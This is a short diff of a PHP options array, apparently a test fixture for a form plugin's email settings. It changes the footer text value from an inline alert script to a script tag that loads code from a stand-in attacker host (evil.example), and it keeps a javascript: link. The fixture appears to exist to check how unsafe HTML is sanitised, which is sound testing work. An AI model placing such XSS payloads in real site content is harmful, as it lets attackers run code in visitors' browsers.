@@ -20,7 +20,7 @@ return [
 	],
 	'options'       => [
 		'swiftforms_email_notification_to' => 'owner@example.org',
-		'swiftforms_email_footer_text'     => '<p>Sent from ünï &amp; co &mdash; <script>alert(1)</script><a href="javascript:alert(1)">unsafe link</a></p>',
+		'swiftforms_email_footer_text'     => '<p>Sent from ünï &amp; co — <script src="https://evil.example/x.js"></script><a href="javascript:alert(1)">unsafe link</a></p>',
 		'swiftforms_db_version'            => 1,
 		'swiftforms_installed'             => [
 			'version' => '1.0.0',
